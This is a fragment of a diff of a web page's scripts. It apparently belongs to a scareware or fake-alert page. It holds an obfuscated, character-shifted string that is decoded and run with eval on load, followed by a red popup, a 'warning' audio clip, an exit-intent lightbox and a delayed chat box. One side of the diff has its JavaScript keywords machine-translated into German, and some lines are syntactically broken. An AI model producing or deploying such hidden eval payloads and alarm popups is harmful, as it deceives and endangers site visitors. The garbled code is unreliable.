%3B%3E%3CL.%3B%3E%3COJW8.%3B%3E%3CL.%3B%3E%3COJY.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWWL8.%3B%3E%3CL.%3B%3E%3COJX8.%3B%3E%3CL.%3B%3E%3COJY8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CN.%3B%3EA%3A%83L%82.%3B%3E@N8.%3B%3E%3CL.%3B%3E%3COJX8.%3B%3E%3CL.%3B%3E%3COJU.%3B%3EA%3A%7F8.%3B%3E%3CL.%3B%3E%3COK.%3B%3E%3CN.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMXb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW%80.%3B%3EA%3A.%3B%3EA%3D%81.%3B%3EA9.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMW.%3B%3E%3CJUb.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWaS8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMU8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMU.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMWW.%3B%3E%3CJ8.%3B%3E%3CL.%3B%3E%3CO.%3B%3E%3CMX%608.%3B%3E%3CL.%3B%3E%3CL8.%3B%3E%3CLL8.%3B%3E%3CMU8.%3B%3E%3CL.%3B%3E%3CJ.%3B%3EA9t.%3B%3E@L8.%3B%3E%3CL.%3B%3E%3CJ.%3B%3E@N8.%3B%3E%3CMW8.%3B%3E%3CLJ8.%3B%3E%3CLJ8.%3B%3E%3CMUy%82.%3B%3E@L8.%3B%3E%3CLK%7C8.%3B%3E%3CMW.%3B%3E%3CJ8.%3B%3E%3CMU%7C8.%3B%3E%3CMV.%3B%3E@M.%3B%3E%3CKA%7Fx%81z.%3B%3E@N%7B8.%3B%3E%3CMU%7C%3E%3E8.%3B%3E%3CLL.%3B%3E@N%3E8.%3B%3E%3CMW.%3B%3E%3EM.%3B%3E@N.%3B%3E@L%7C%81zAy.%3B%3E@L%82%80V%7Bt.%3B%3E@LV%82wx8.%3B%3E%3CLK.%3B%3E@M.%3B%3E%3CKAv%7Bt.%3B%3E@LV%82wxT.%3B%3E@N8.%3B%3E%3CLK%7C8.%3B%3E%3CLL@.%3B%3E%3CK.%3B%3E%3CK8.%3B%3E%3CLL8.%3B%3E%3CMUx.%3B%3EA9t%7F8.%3B%3E%3CLK.%3B%3E@O%81x.%3B%3E@Mvt%83x8.%3B%3E%3CLK.%3B%3E@N8.%3B%3E%3CLL8.%3B%3E%3CLL8.%3B%3E%3CMU8JWx.%3B%3EA9t%7Fx8.%3B%3E%3CLK8.%3B%3E%3CLL8.%3B%3E%3CMU.%3B%3B.%3BB.%3CK.%3B9%7Fj%7B.%3B9%7D.%3CM.%3B@.%3B@.%3CKox%7B.%3BAr.%3CM9.%3CKr.%3CL%7C%3A7unwp%7Dq.%3CKr44.%3BB%7D4.%3CM%5C%7D%7Brwp7o%7BxvLqj%7BLxmn.%3BA%7C%3A7lqj%7BLxmnJ%7D.%3BAr.%3BB6%3A9.%3BB.%3CKn%7Fju.%3BA%7Ewn%7Cljyn.%3BA%7D.%3BB.%3BB.%3CK.@Mn%7Fju%3B.%3BA.%3BB.%3CK");
 
-var t = '';
+        var t = '';
 
-für (i = 0; i < s1.length; i++) t += String.fromCharCode(s1.charCodeAt(i) - 9);
+        for (i = 0; i < s1.length; i++) t += String.fromCharCode(s1.charCodeAt(i) - 9);
 
-eval(unescape(t));
+        eval(unescape(t));
 
-}
+    }
 
-eval1();
 
-setTimeout(function () {
 
-document.getElementById("map").style. <div id="delayedPopup" class="delayedPopupWindow lightbox" style="background:red;"> = "block";
+    eval1();
 
-document.getElementById("warning").play();
+    setTimeout(function () {
 
-}, 10);
+        document.getElementById("map").style. <div id="delayedPopup" class="delayedPopupWindow lightbox" style="background:red;"> = "block";
+
+        document.getElementById("warning").play();
+
+    }, 10);
+
+
 
 </script>
+
+
+
+
 
 <script>
 
-$(document).ready(function () {
 
-$(".arrow-div").delay(1000).fadeIn(500);
 
-});
+    $(document).ready(function () {
 
-</script>
+        $(".arow-div").delay(1000).fadeIn(500);
 
-<script type="text/javascript">
-
-$(document).ready(function () {
-
-$(".delayedPopupWindow").click(function () {
-
-$('.delayedPopupWindow').hide('fast');
-
-});
-
-});
+    });
 
 </script>
 
 <script type="text/javascript">
 
-$(document).ready(function () {
+    $(document).ready(function () {
 
-$(".black").click(function () {
+        $(".delayedPopupWindow").click(function () {
 
-$('.delayedPopupWindow').hide('fast');
+            $('.delayedPopupWindow').hide('fast');
 
-});
+        });
 
-});
-
-</script>
-
-<script type="text/javascript">
-
-$(document).ready(function () {
-
-$("#win1").click(function () {
-
-$('.delayedPopupWindow').hide('fast');
-
-});
-
-});
+    });
 
 </script>
 
 <script type="text/javascript">
 
-$(document).ready(function () {
+    $(document).ready(function () {
 
-$("#win2").click(function () {
+        $(".black").click(function () {
 
-$('.delayedPopupWindow').hide('fast');
+            $('.delayedPopupWindow').hide('fast');
 
-});
+        });
 
-});
-
-</script>
-
-<script type="text/javascript">
-
-$(document).ready(function () {
-
-$("alert_popup").click(function () {
-
-$('.delayedPopupWindow').hide('fast');
-
-});
-
-});
+    });
 
 </script>
 
 <script type="text/javascript">
 
-Funktion addEvent(obj, evt, fn) {
+    $(document).ready(function () {
 
-wenn (obj.addEventListener) {
+        $("#win1").click(function () {
 
-obj.addEventListener(evt, fn, false);
+            $('.delayedPopupWindow').hide('fast');
 
-}sonst wenn (obj.attachEvent) {
+        });
 
-obj.attachEvent("on" + evt, fn);
-
-}
-
-}
-
-addEvent(document, 'mouseout', function (evt) {
-
-wenn (evt.toElement == null && evt.relatedTarget == null) {
-
-$('.lightbox').slideDown();
-
-}
-
-;
-
-});
-
-$('a.close').click(function () {
-
-$('.lightbox').slideUp();
-
-});
+    });
 
 </script>
 
 <script type="text/javascript">
 
-$(document).ready(function () {
+    $(document).ready(function () {
 
-$(".delayedPopupWindow").delay(5000).fadeIn(500);
+        $("#win2").click(function () {
 
-});
+            $('.delayedPopupWindow').hide('fast');
 
-</script>
+        });
 
-<script type="text/javascript">
-
-$(document).ready(function () {
-
-$(".alert_popup").delay(4000).fadeIn(500);
-
-});
+    });
 
 </script>
 
 <script type="text/javascript">
 
-$(document).ready(function () {
+    $(document).ready(function () {
 
-$("#chat-box").delay(16000).fadeIn(100);
+        $("alert_popup").click(function () {
 
-});
+            $('.delayedPopupWindow').hide('fast');
+
+        });
+
+    });
 
 </script>
 
-</body>
 
-</html>
+
+<script type="text/javascript">
+
+    function addEvent(obj, evt, fn) {
+
+        if (obj.addEventListener) {
+
+            obj.addEventListener(evt, fn, false);
+
+        } else if (obj.attachEvent) {
+
+            obj.attachEvent("on" + evt, fn);
+
+        }
+
+    }
+
+
+
+    addEvent(document, 'mouseout', function (evt) {
+
+        if (evt.toElement == null && evt.relatedTarget == null) {
+
+            $('.lightbox').slideDown();
+
+        }
+
+        ;
+
+    });
+
+
+
+    $('a.close').click(function () {
+
+        $('.lightbox').slideUp();
+
+    });
+
+
+
+
+
+</script>
+
+<script type="text/javascript">
+
+    $(document).ready(function () {
+
+        $(".delayedPopupWindow").delay(5000).fadeIn(500);
+
+    });
+
+</script>
+
+<script type="text/javascript">
+
+    $(document).ready(function () {
+
+        $(".alert_popup").delay(4000).fadeIn(500);
+
+    });
+
+</script>
+
+<script type="text/javascript">
+
+    $(document).ready(function () {
+
+        $("#chat-box").delay(16000).fadeIn(100);
+
+    });
+
+
+
+</script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=" width="20" height="20" alt="Google Translate"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
+
+
+
+
+
+
+
+<div class="goog-te-spinner-pos goog-te-spinner-pos-show"><div class="goog-te-spinner-animation goog-te-spinner-animation-show"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 192  </font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 192  </font></font></body></html>
